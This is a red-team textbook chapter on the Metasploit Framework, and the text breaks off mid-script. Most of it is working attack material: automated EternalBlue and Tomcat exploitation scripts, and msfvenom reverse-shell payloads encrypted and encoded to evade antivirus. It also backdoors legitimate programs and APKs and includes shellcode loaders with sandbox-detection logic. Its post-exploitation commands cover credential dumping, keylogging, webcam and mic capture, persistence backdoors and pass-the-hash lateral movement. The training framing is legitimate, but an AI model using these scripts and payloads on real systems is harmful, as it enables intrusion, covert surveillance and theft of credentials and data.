# Chapter 7: Metasploit Framework In-Depth

![Metasploit Framework Architecture](./images/metasploit_architecture.png)
*Figure 7.1: The Metasploit Framework Architecture with core components illustrated*

## Introduction to the Metasploit Framework

The Metasploit Framework stands as the most comprehensive, well-maintained exploitation toolkit available today. Created by H.D. Moore in 2003 and now maintained by Rapid7, Metasploit has evolved from a simple collection of exploits to an extensible platform for developing, testing, and executing exploit code. For red teamers, Metasploit represents the primary offensive toolset that streamlines the process from initial access to post-exploitation.

This chapter assumes you're familiar with Metasploit's existence and basic purpose. We'll skip installation details (readily available in both Kali and Parrot distributions) and dive directly into the advanced operational usage that red team exercises require.

## MSFconsole: Core Interface Mastery

The MSFconsole provides the primary interface to the Metasploit Framework. While GUI alternatives exist (Armitage, for example), advanced users gravitate toward the console for its speed, flexibility, and complete access to all framework features.

### Command Structure and Workflows

The MSFconsole interface follows a hierarchical command structure:

- **Global commands**: Available anywhere (help, search, version)
- **Context-sensitive commands**: Available in specific contexts (show options, set, exploit)
- **Module-specific commands**: Available only when a module is loaded (check, run, exploit)

Basic workflow in MSFconsole:

1. **Search for modules**: Find appropriate exploits or auxiliary modules
2. **Select a module**: Load the module for configuration
3. **Configure options**: Set required and optional parameters
4. **Execute the module**: Run the exploit or auxiliary function
5. **Post-exploitation**: Interact with the session after successful exploitation

### Efficient Navigation and Information Management

The MSFconsole environment can be overwhelming with thousands of modules. Mastering navigation is essential for operational efficiency.

#### Search Functionality

```bash
# Basic search for modules
msf6 > search type:exploit platform:windows ms17

# Advanced searching with multiple criteria
msf6 > search type:exploit platform:windows cve:2021 rank:excellent

# Filtering search by text in description
msf6 > search type:exploit name:apache tomcat

# JSON output for programmatic processing
msf6 > search cve:2021 -o /tmp/cve_2021_exploits.json
```

**Key Search Parameters:**

| Parameter | Description | Example |
|-----------|-------------|---------|
| `type:` | Module type | `type:exploit`, `type:auxiliary` |
| `name:` | Module name | `name:apache` |
| `platform:` | Target platform | `platform:windows` |
| `author:` | Module author | `author:hdm` |
| `cve:` | CVE identifier | `cve:2021` |
| `rank:` | Reliability ranking | `rank:excellent` |
| `port:` | Target port | `port:445` |
| `app:` | Target application | `app:wordpress` |

#### Module Information and Documentation

```bash
# View detailed module information
msf6 > info exploit/windows/smb/ms17_010_eternalblue

# View required options
msf6 > options

# Show available targets
msf6 > show targets

# Show advanced options
msf6 > show advanced

# Show available payloads
msf6 > show payloads

# Show evasion options
msf6 > show evasion
```

#### Framework Navigation

```bash
# Show current active module
msf6 > current

# List active sessions
msf6 > sessions -l

# List established connections
msf6 > connections

# Back to main menu
msf6 exploit(windows/smb/ms17_010_eternalblue) > back

# Quickly use another module
msf6 > use auxiliary/scanner/smb/smb_version
```

### Essential Commands

| Command | Description | Example |
|---------|-------------|---------|
| `search` | Find modules by keyword, CVE, type, etc. | `search type:exploit platform:windows ms17` |
| `use` | Select a module to use | `use exploit/windows/smb/ms17_010_eternalblue` |
| `show options` | Display module options | `show options` |
| `set` | Set an option value | `set RHOSTS 192.168.1.10` |
| `setg` | Set a global option value | `setg LHOST 192.168.1.5` |
| `unset` | Clear an option value | `unset PAYLOAD` |
| `run` / `exploit` | Execute the module | `run` or `exploit` |
| `back` | Return to the main console | `back` |
| `info` | Display detailed module information | `info` |
| `sessions` | List or interact with established sessions | `sessions -i 1` |
| `background` | Background the current session | `background` |
| `jobs` | Manage background jobs | `jobs -l` |

### Database Integration

The Metasploit Framework integrates with PostgreSQL to store scan results, hosts, credentials, and other data across sessions. This integration is critical for managing complex engagements.

#### Database Setup and Management

```bash
# Check database status
msf6 > db_status

# Connect to a database
msf6 > db_connect postgres:password@127.0.0.1/msf

# Initialize the database (alternative method)
sudo msfdb init

# Create and use a workspace
msf6 > workspace -a client_engagement_2025
msf6 > workspace client_engagement_2025

# List available workspaces
msf6 > workspace -l

# Import scan results
msf6 > db_import /path/to/nmap_scan.xml

# Show discovered hosts
msf6 > hosts

# Show discovered services
msf6 > services

# Show collected credentials
msf6 > creds

# Filter services by port
msf6 > services -p 445

# Filter hosts by operating system
msf6 > hosts -o Windows

# Export database to a file
msf6 > db_export -f xml /path/to/export.xml
```

#### Advanced Database Queries

```bash
# Find all hosts with open web ports
msf6 > services -p 80,443,8080,8443 -S http -R

# Filter to show only unique addresses
msf6 > services -u -c address,port,name

# Detailed host information including vulnerabilities
msf6 > hosts -d

# Filter services by name and port
msf6 > services -S http -p 80
```

#### Automating Target Selection

```bash
# Set RHOSTS based on database query
msf6 > services -p 445 -S microsoft-ds -R

# Set RHOSTS with specific operating system
msf6 > hosts -o Windows -R
```

### Example: Setting up Workspaces for Different Engagements

Workspaces allow you to organize targets and findings by project, preventing data contamination between different engagements:

```
msf6 > workspace
* default
msf6 > workspace -a client_a
[*] Added workspace: client_a
msf6 > workspace -a client_b
[*] Added workspace: client_b
msf6 > workspace client_a
[*] Workspace: client_a
msf6 > hosts -a 192.168.1.0/24
msf6 > workspace client_b
[*] Workspace: client_b
msf6 > hosts -a 10.10.10.0/24
```

Switching between workspaces allows you to maintain separate databases for each engagement, improving organization and reporting clarity.

> **PRACTICAL TIP:**
> 
> Create separate workspaces for different phases of an engagement or different network segments. This helps maintain operational organization and prevents cross-contamination of data.
> 
> ```bash
> # Create and switch between workspaces
> msf6 > workspace -a perimeter_recon
> msf6 > workspace -a internal_network
> msf6 > workspace -a domain_controllers
> ```

### Command Execution and Resource Scripts

While interactive use is common, Metasploit truly shines with automation using resource scripts.

#### Basic Command Execution

```bash
# Execute a single shell command
msf6 > execute cmd.exe /c dir

# Execute and capture output
msf6 > irb
>> output = `ping -c 4 8.8.8.8`
>> puts output
```

#### Resource Scripts

Resource scripts contain a sequence of Metasploit commands to be executed automatically. They're essential for repeatable workflows.

**Simple resource script example (smb_scan.rc):**

```ruby
# Set the network range to scan
setg RHOSTS 192.168.1.0/24

# Use the SMB version scanner
use auxiliary/scanner/smb/smb_version

# Set scan options
set THREADS 16

# Start the scan
run

# Switch to MS17-010 scanner
use auxiliary/scanner/smb/smb_ms17_010

# Run the scan
run

# Back to prompt
back
```

Execute with:
```bash
msf6 > resource smb_scan.rc
```

**Advanced resource script (automated_exploitation.rc):**

```ruby
# Create a workspace for this engagement
workspace -a target_network

# Import existing scan data
db_import /path/to/nmap_results.xml

# Set global variables
setg RHOSTS 192.168.1.0/24
setg LHOST 192.168.1.200
setg LPORT 4444

# SMB version scanning
use auxiliary/scanner/smb/smb_version
set THREADS 16
run

# Scan for MS17-010 vulnerability
use auxiliary/scanner/smb/smb_ms17_010
run

# Attempt to exploit vulnerable systems
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set AutoCheck true
set AutoRunScript multi_console_command -rc /path/to/post_exploit.rc
set ExitOnSession false
run -j

# Scan for web servers
use auxiliary/scanner/http/http_version
set THREADS 25
run

# Tomcat credential scanner
use auxiliary/scanner/http/tomcat_mgr_login
set TARGETURI /manager/html
set THREADS 10
run

# Attempt to exploit Tomcat if credentials found
<ruby>
framework.db.services.each do |service|
  if service.name =~ /http/ and service.port == 8080
    self.run_single("use exploit/multi/http/tomcat_mgr_deploy")
    self.run_single("set RHOSTS #{service.host.address}")
    self.run_single("set RPORT #{service.port}")
    self.run_single("set PAYLOAD java/meterpreter/reverse_tcp")
    self.run_single("set TARGET 0")
    self.run_single("set HttpUsername tomcat")
    self.run_single("set HttpPassword tomcat")
    self.run_single("run -j")
  end
end
</ruby>

# Show active sessions
sessions -l

echo "Exploitation phase complete. Check active sessions."
```

**Post-exploitation resource script (post_exploit.rc):**

```ruby
# Gather system information
run post/windows/gather/enum_system

# Dump password hashes
run post/windows/gather/hashdump

# Check for privilege escalation opportunities
run post/multi/recon/local_exploit_suggester

# Attempt to obtain SYSTEM privileges
getsystem

# Migrate to a more stable process
pgrep explorer.exe
migrate PROCESS_ID
```

#### Executing Ruby Code

For more complex automation, embed Ruby code in resource scripts:

```ruby
<ruby>
# Define target range
target_range = "192.168.1.0/24"
ports = [22, 80, 443, 445, 3389]

# Scan each port
ports.each do |port|
  print_status("Scanning port #{port}...")
  run_single("use auxiliary/scanner/portscan/tcp")
  run_single("set RHOSTS #{target_range}")
  run_single("set PORTS #{port}")
  run_single("set THREADS 50")
  run_single("run")
end

# Extract hosts with open port 445
smb_hosts = []
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.port == 445 && service.state == "open"
      smb_hosts << host.address
    end
  end
end

if smb_hosts.empty?
  print_error("No hosts found with open SMB ports")
else
  # Target those hosts with EternalBlue
  print_good("Found #{smb_hosts.length} hosts with open SMB ports")
  smb_hosts.each do |host|
    print_status("Targeting #{host} with EternalBlue...")
    run_single("use exploit/windows/smb/ms17_010_eternalblue")
    run_single("set RHOSTS #{host}")
    run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
    run_single("set LHOST 192.168.1.200")
    run_single("set LPORT 4444")
    run_single("exploit -j")
  end
end
</ruby>
```

### Advanced MSFconsole Features

**Route Management**: Direct traffic through compromised hosts to access otherwise unreachable networks:

```
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
Active Routing Table
===================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1
```

**Pivoting with SOCKS Proxy**: Create a SOCKS proxy through an established session:

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```

**Logging**: Record all console activity for documentation:

```
msf6 > spool /tmp/msf_console.log
[*] Spooling to file /tmp/msf_console.log...
```

> **CASE STUDY: Healthcare Provider Breach (2019)**
> 
> In 2019, a major healthcare provider suffered a breach when attackers used Metasploit resource scripts to automate exploitation across their network. The initial entry point was a single vulnerable system exposed to the internet. Using resource scripts similar to those shown above, attackers quickly enumerated the internal network and identified all vulnerable systems. Within hours, they had deployed ransomware across 80% of the organization.
> 
> The investigation revealed that the attackers used staged resource scripts that first performed non-intrusive reconnaissance, then exploited vulnerable systems, established persistence, and finally deployed the payload. This methodical approach allowed them to operate efficiently while minimizing detection opportunities.
> 
> *Source: Sanitized incident response report from a major security vendor, 2019*

## Payload Generation and Delivery

Payloads represent the code delivered to and executed on target systems. Metasploit offers a sophisticated payload architecture that supports complex post-exploitation capabilities.

### Understanding Payload Types

Metasploit supports different payload types for different scenarios:

**Singles** - Self-contained payloads that perform a specific action and exit.
**Stagers** - Small payloads that establish a channel between attacker and victim.
**Stages** - Larger payloads delivered over the channel established by a stager.

```bash
# List payload types
msf6 > show payload types

# Show singles (non-staged) payloads
msf6 > show payloads singles

# Show staged payloads
msf6 > show payloads staged

# Show meterpreter payloads
msf6 > show payloads windows/meterpreter
```

#### Payload Naming Conventions

Understanding Metasploit's payload naming is essential:

| Pattern | Meaning | Example |
|---------|---------|---------|
| `<platform>/` | Target operating system | `windows/`, `linux/`, `osx/` |
| `<arch>/` | Target architecture | `x86/`, `x64/`, `mipsle/` |
| `<payload_name>` | Payload functionality | `shell`, `exec`, `meterpreter` |
| `/reverse_tcp` | Connection method | `reverse_tcp`, `bind_tcp`, `reverse_https` |

Example: `windows/x64/meterpreter/reverse_tcp`
- Platform: Windows
- Architecture: 64-bit
- Payload: Meterpreter
- Connection method: Reverse TCP

### MSFvenom: Advanced Payload Generation

MSFvenom is a command-line utility that combines the functionality of MSFpayload and MSFencode, allowing for powerful payload generation and encoding.

#### Basic MSFvenom Usage

```bash
# Generate a basic reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe > shell.exe

# Generate a Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.200 LPORT=443 -f exe > meterpreter.exe

# Generate a Linux payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f elf > shell.elf

# List available formats
msfvenom --list formats

# List available platforms
msfvenom --list platforms

# List available architectures
msfvenom --list archs
```

#### Output Formats for Different Scenarios

```bash
# Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe > payload.exe

# Windows service executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe-service > service.exe

# DLL file
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f dll > payload.dll

# PowerShell command
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f psh -o payload.ps1

# Java WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f war > payload.war

# Python script
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw > payload.py

# ASP file
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f asp > payload.asp

# JavaScript
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f js_le > payload.js
```

#### Encoding and Evasion Techniques

Antivirus software can detect standard Metasploit payloads. Encoding helps bypass these detections:

```bash
# List available encoders
msfvenom --list encoders

# Apply a single encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -e x64/xor -f exe > encoded_payload.exe

# Apply multiple iterations of encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -e x64/xor -i 10 -f exe > multi_encoded.exe

# Use the most effective encoder for the platform
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -e x64/shikata_ga_nai -i 15 -f exe > best_encoded.exe

# Add custom padding for further obfuscation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -e x64/shikata_ga_nai -i 15 -b "\x00" -f exe -n 20 > evasive_payload.exe
```

#### Payload Templates and Backdooring

```bash
# Use a legitimate executable as a template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -x putty.exe -f exe > malicious_putty.exe

# Backdoor an Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -x original.apk -o backdoored.apk
```

#### Advanced Evasion with Encrypted Payloads

For more sophisticated evasion, encrypt payloads to bypass signature-based detection:

```bash
# Generate an encrypted payload with custom key
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.200 LPORT=443 -e x64/shikata_ga_nai -i 10 --encrypt aes256 --encrypt-key r4nD0mK3yString -f exe > encrypted_payload.exe

# Generate an encrypted payload with custom IV and key
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.200 LPORT=443 --encrypt rc4 --encrypt-key s3cr3tk3y --encrypt-iv initv3c -f exe > rc4_encrypted.exe
```

### Custom Shellcode Integration

For truly advanced evasion, integrate custom shellcode with MSFvenom:

```bash
# Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.200 LPORT=443 -f raw > shellcode.bin

# Inject shellcode into a C program
cat << 'EOT' > shellcode_loader.c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    /* paste shellcode here */
};

int main() {
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
    return 0;
}
EOT

# Compile with MinGW (on Kali or Parrot)
x86_64-w64-mingw32-gcc shellcode_loader.c -o custom_loader.exe -lws2_32
```

#### Python Shellcode Executor

```python
#!/usr/bin/python3
import ctypes
import sys

# Read shellcode from file
with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

# Allocate virtual memory
shellcode_buffer = ctypes.create_string_buffer(shellcode)
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# Mark memory as executable and call the shellcode
shellcode_func()
```

#### Shellcode Analysis Evasion

To bypass modern endpoint protection that performs shellcode analysis:

```c
// Snippet of shellcode runner with basic evasion
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Encrypted shellcode (XOR with key 0x41)
unsigned char encrypted_shellcode[] = { /* encrypted bytes */ };

// Shellcode size 
size_t shellcode_size = sizeof(encrypted_shellcode);

// Decryption function
void decrypt_shellcode(unsigned char *shellcode, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        shellcode[i] ^= key;
    }
}

// Environment check function
int is_sandbox() {
    // Check total system memory (sandboxes often have less than 4GB)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    DWORDLONG totalPhysMem = memInfo.ullTotalPhys;
    if (totalPhysMem < 4ULL * 1024ULL * 1024ULL * 1024ULL) {
        return 1;
    }
    
    // Check running processes for VM/sandbox indicators
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    
    do {
        // Check for analysis tools or VM processes
        if (strcmp(pe32.szExeFile, "vboxservice.exe") == 0 ||
            strcmp(pe32.szExeFile, "vmtoolsd.exe") == 0 ||
            strcmp(pe32.szExeFile, "wireshark.exe") == 0) {
            CloseHandle(hSnapshot);
            return 1;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    // Timing check (most sandboxes analyze for under 10 seconds)
    DWORD start_time = GetTickCount();
    Sleep(10000); // Sleep for 10 seconds
    DWORD end_time = GetTickCount();
    
    // If less than 9.5 seconds elapsed, likely a sandbox with accelerated sleep
    if (end_time - start_time < 9500) {
        return 0;
    }
    
    // Check for analysis environment
    if (is_sandbox()) {
        return 0;
    }
    
    // Create a decrypted copy of the shellcode
    unsigned char *shellcode = (unsigned char *)malloc(shellcode_size);
    if (!shellcode) {
        return 1;
    }
    
    memcpy(shellcode, encrypted_shellcode, shellcode_size);
    decrypt_shellcode(shellcode, shellcode_size, 0x41);
    
    // Allocate memory with RWX permissions
    void *exec_mem = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        free(shellcode);
        return 1;
    }
    
    // Copy the shellcode to the executable memory
    memcpy(exec_mem, shellcode, shellcode_size);
    
    // Zero out the decrypted buffer to avoid memory scanning
    memset(shellcode, 0, shellcode_size);
    free(shellcode);
    
    // Execute the shellcode
    ((void(*)())exec_mem)();
    
    return 0;
}
```

> **PRACTICAL TIP:**
> 
> Modern antivirus solutions can detect even sophisticated shellcode runners. Consider these additional techniques:
> 
> 1. Process injection rather than direct execution
> 2. Sleeping/timing checks to evade sandboxes
> 3. Environment checks (VM detection, username checks)
> 4. Breaking shellcode into encrypted chunks reassembled at runtime
> 5. Using legitimate process hollowing techniques

## Post-Exploitation Modules

Once access is gained to a target system, Metasploit's post-exploitation modules enable comprehensive system enumeration, privilege escalation, and persistence.

### Session Management

```bash
# List all active sessions
msf6 > sessions -l

# Interact with a specific session
msf6 > sessions -i 1

# Background the current interactive session (from within the session)
meterpreter > background

# Run a command on a specific session
msf6 > sessions -c "whoami" -i 1

# Kill a specific session
msf6 > sessions -k 1

# Upgrade a shell to meterpreter
msf6 > sessions -u 1

# Route traffic through a compromised host
msf6 > sessions -r 1
```

### Meterpreter Essentials

Meterpreter is Metasploit's advanced payload that provides extensive post-exploitation capabilities.

#### System Reconnaissance

```bash
# Get system information
meterpreter > sysinfo

# Get current user information
meterpreter > getuid

# Get current privileges
meterpreter > getprivs

# Show network interfaces
meterpreter > ipconfig

# Show running processes
meterpreter > ps

# Run shell commands
meterpreter > shell
C:\> whoami
C:\> exit

# Execute single shell command
meterpreter > execute -f cmd.exe -a "/c whoami"

# Take a screenshot
meterpreter > screenshot

# Record microphone
meterpreter > record_mic -d 10
```

#### File System Operations

```bash
# Navigate directories
meterpreter > pwd
meterpreter > cd C:\\Users\\Administrator

# List files
meterpreter > ls

# Upload files
meterpreter > upload /path/to/local/file.txt C:\\target\\path\\

# Download files
meterpreter > download C:\\Windows\\repair\\sam /tmp/

# Edit a file
meterpreter > edit C:\\Windows\\System32\\drivers\\etc\\hosts

# Search for files
meterpreter > search -f password*.txt
meterpreter > search -d C:\\Users -f *.kdbx

# Calculate file hashes
meterpreter > checksum md5 C:\\Windows\\System32\\calc.exe
```

#### Process Control

```bash
# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Kill a process
meterpreter > kill 1234

# Execute a program
meterpreter > execute -f notepad.exe

# Execute with arguments
meterpreter > execute -f cmd.exe -a "/c dir C:\\"

# Execute and interact with output
meterpreter > execute -f cmd.exe -a "/c ipconfig /all" -i -H
```

#### Privilege Escalation

```bash
# Attempt automatic privilege escalation
meterpreter > getsystem

# Show available techniques if getsystem fails
meterpreter > getsystem -t 0

# Bypass UAC (User Account Control)
meterpreter > run post/windows/escalate/bypassuac

# Show current privileges
meterpreter > getprivs

# Enable a specific privilege
meterpreter > enable_token_privileges SeDebugPrivilege
```

#### Credential Harvesting

```bash
# Dump password hashes
meterpreter > hashdump

# Dump lsa secrets
meterpreter > lsa_dump_secrets

# Access Windows Credentials Manager
meterpreter > run post/windows/gather/credentials/credential_collector

# Mimikatz integration
meterpreter > load kiwi
meterpreter > creds_all

# Extract browser credentials
meterpreter > run post/windows/gather/enum_chrome
meterpreter > run post/windows/gather/enum_firefox
```

#### Network Operations

```bash
# View routing table
meterpreter > route

# Port forwarding
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Proxy traffic through the compromised host
meterpreter > run autoroute -s 10.0.0.0/24

# Set up a SOCKS proxy
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > run -j
```

### Advanced Post-Exploitation Modules

Metasploit includes hundreds of post-exploitation modules for comprehensive system assessment.

#### System Enumeration

```bash
# General system enumeration
meterpreter > run post/windows/gather/enum_system

# Application enumeration
meterpreter > run post/windows/gather/enum_applications

# Logged-in users
meterpreter > run post/windows/gather/enum_logged_on_users

# Domain information
meterpreter > run post/windows/gather/enum_domain

# Network share enumeration
meterpreter > run post/windows/gather/enum_shares
```

#### Privilege Escalation Modules

```bash
# Check for exploitable vulnerabilities
meterpreter > run post/multi/recon/local_exploit_suggester

# Windows privilege escalation checks
meterpreter > run post/windows/gather/enum_patches
meterpreter > run post/windows/escalate/getsystem

# Unquoted service path exploitation
meterpreter > run post/windows/escalate/unquoted_service_path

# Token impersonation
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\User"
```

#### Persistence Mechanisms

```bash
# Add a backdoor user
meterpreter > run post/windows/manage/add_user_domain USERNAME=hacker PASSWORD=P@ssw0rd

# Scheduled task persistence
meterpreter > run persistence -X -i 60 -p 443 -r 192.168.1.200

# Registry persistence
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d '"C:\\Windows\\System32\\backdoor.exe"'

# Service persistence
meterpreter > run post/windows/manage/persistence_service

# WMI persistence
meterpreter > run post/windows/manage/wmi_persistence

# Backdoor installation
meterpreter > run post/windows/manage/backdoor_install
```

#### Data Collection and Exfiltration

```bash
# Keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Screenshot capture
meterpreter > screenshot

# Webcam snapshot
meterpreter > webcam_snap

# Audio recording
meterpreter > record_mic -d 30

# Email collection
meterpreter > run post/windows/gather/enum_outlook

# Browser history and bookmarks
meterpreter > run post/windows/gather/enum_chrome
```

### Example: Complete Post-Compromise Workflow

This workflow demonstrates a systematic approach to post-exploitation after gaining initial access:

1. **Reconnaissance**:
   ```
   meterpreter > run post/windows/gather/enum_logged_on_users
   meterpreter > run post/windows/gather/enum_shares
   meterpreter > run post/windows/gather/enum_applications
   ```

2. **Privilege Escalation**:
   ```
   meterpreter > run post/multi/recon/local_exploit_suggester
   msf6 > use exploit/windows/local/ms16_075_reflection_juicy
   msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
   msf6 exploit(windows/local/ms16_075_reflection_juicy) > run
   ```

3. **Credential Harvesting**:
   ```
   meterpreter > load kiwi
   meterpreter > creds_all
   meterpreter > lsa_dump_sam
   ```

4. **Lateral Movement**:
   ```
   msf6 > use exploit/windows/smb/psexec
   msf6 exploit(windows/smb/psexec) > set SMBDomain WORKGROUP
   msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
   msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
   msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.11
   msf6 exploit(windows/smb/psexec) > run
   ```

5. **Establish Persistence**:
   ```
   msf6 > use post/windows/manage/persistence_exe
   msf6 post(windows/manage/persistence_exe) > set SESSION 3
   msf6 post(windows/manage/persistence_exe) > set EXE_NAME svchost.exe
   msf6 post(windows/manage/persistence_exe) > set STARTUP USER
   msf6 post(windows/manage/persistence_exe) > run
   ```

6. **Data Exfiltration**:
   ```
   meterpreter > run post/windows/gather/smart_hashdump
   meterpreter > search -f *.docx
   meterpreter > download C:\\Users\\Administrator\\Documents\\strategic_plan.docx
   ```

### Pivoting and Network Expansion

One of Metasploit's most powerful capabilities is using compromised systems as pivots to access otherwise unreachable network segments.

#### Discovery Beyond the Initial Target

```bash
# Set up routes through the compromised host
meterpreter > run autoroute -s 10.0.0.0/24

# List current routes
msf6 > route

# Add a manual route
msf6 > route add 10.0.0.0/24 1

# Scan through the pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.0.0.1-254
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445
msf6 auxiliary(scanner/portscan/tcp) > run
```

#### Setting Up Proxies

```bash
# Create a SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# Create a reverse port forward
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.10
```

#### Advanced Lateral Movement

```bash
# Use WMI for lateral movement
msf6 > use exploit/windows/local/wmi
msf6 exploit(windows/local/wmi) > set SESSION 1
msf6 exploit(windows/local/wmi) > set RHOSTS 10.0.0.10
msf6 exploit(windows/local/wmi) > set SMBUser Administrator
msf6 exploit(windows/local/wmi) > set SMBPass "P@ssw0rd"
msf6 exploit(windows/local/wmi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/wmi) > set LHOST 192.168.1.200
msf6 exploit(windows/local/wmi) > run

# Use PsExec for lateral movement
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.0.10
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass "P@ssw0rd"
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > run

# Use pass-the-hash techniques
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.0.10
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > run
```

> **PRACTICAL TIP:**
> 
> When pivoting through multiple network segments, document your route topology carefully. Complex pivoting chains can be difficult to manage:
> 
> ```bash
> # Example pivot chain documentation
> # Internet → 192.168.1.200 (attacker) → 192.168.1.100 (pivot1) → 10.0.0.0/24 → 10.0.0.50 (pivot2) → 172.16.0.0/24
> 
> # Setup on pivot1
> meterpreter > run autoroute -s 10.0.0.0/24
> 
> # Setup on pivot2
> meterpreter > run autoroute -s 172.16.0.0/24
> 
> # Verify routes
> msf6 > route print
> ```

## Metasploit Automation

While interactive use is valuable for exploration, automation is essential for operational efficiency in red team engagements.

### API and Scripting Interface

Metasploit provides a powerful RPC API that can be accessed via various programming languages.

#### Starting the RPC Server

```bash
# Start Metasploit with RPC enabled
msfrpcd -U msf -P password -a 127.0.0.1 -p 55553 -S

# Connect from another terminal
msf6 > load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=password SSL=true
```

#### Python Scripting with Pymetasploit3

```python
#!/usr/bin/env python3
from pymetasploit3.msfrpc import MsfRpcClient

# Connect to the Metasploit RPC server
client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=True)

# Get version information
print(f"Metasploit version: {client.core.version()}")

# List available exploits
exploits = client.modules.exploits
print(f"Available exploits: {len(exploits)}")

# Use an exploit
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')

# Set options
exploit['RHOSTS'] = '192.168.1.100'
exploit['LHOST'] = '192.168.1.200'
exploit['LPORT'] = 4444
exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'

# Execute the exploit
print("Launching exploit...")
exploit.execute()

# Check for sessions
sessions = client.sessions.list
print(f"Active sessions: {sessions}")

# Interact with a session if available
if sessions:
    session_id = list(sessions.keys())[0]
    shell = client.sessions.session(session_id)
    
